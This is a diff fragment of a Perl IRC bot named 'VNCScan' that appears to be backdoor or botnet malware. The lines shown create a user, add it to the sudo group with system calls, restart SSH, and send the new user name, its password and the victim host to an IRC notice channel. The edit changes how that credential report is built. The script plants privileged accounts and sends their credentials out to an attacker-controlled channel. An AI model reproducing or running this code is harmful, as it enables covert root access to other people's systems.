@@ -1,6 +1,7 @@
 use strict;
 use warnings;
 use Mojo::IRC;
+use CGI;
 use Time::HiRes;
 use feature 'say';
 use Fcntl qw(:flock SEEK_END);
@@ -18,6 +19,7 @@ my $range;
 my $minimum;
 my $random_number;
 my $random_user;
+my $q = new CGI;
 my $irc = Mojo::IRC->new(
  #definenickhere
  user => 'VNCScan',
@@ -79,7 +81,7 @@ system '$var';
 system 'sudo usermod -a -G sudo ' . $random_user;
 system "sudo service ssh restart";
   warn 'Getting SSH...';
-  @arr4y = ('9,1Added user:', $us3r, 'password:', $p4ss, 'on host:', $h0st, $h0st1);
+  @arr4y = ('9,1Added user:', $random_user, 'password:', $random_number, 'on host:', $q->remote_host());
   warn "@arr4y";
   $irc->write(notice => $noticechan => @arr4y);
  }
